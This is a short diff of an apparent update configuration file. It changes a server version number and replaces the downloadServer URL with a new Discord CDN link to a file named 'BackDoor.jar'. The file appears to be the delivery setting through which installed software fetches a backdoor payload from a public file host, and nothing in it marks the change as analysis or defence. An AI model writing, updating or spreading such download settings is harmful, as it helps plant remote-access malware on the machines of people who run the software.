@@ -1,4 +1,4 @@
-versionForServer=1.1
+versionForServer=1.0
 versionForClient=1.0
-downloadServer=https://cdn.discordapp.com/attachments/1210246621837918228/1218524039476285522/BackDoor.jar?ex=6607f9f2&is=65f584f2&hm=f3b71d7b6c4782a33d91bbd87fe9c4b4419b336d9214c802fef9babe46506652&
+downloadServer=https://cdn.discordapp.com/attachments/1210246621837918228/1218532811347067000/BackDoor.jar?ex=6608021d&is=65f58d1d&hm=6a94b24f586f759064ba3cfd2755b73ed0145ce0f78d852f47354580df7d543b&
 downloadClient=null
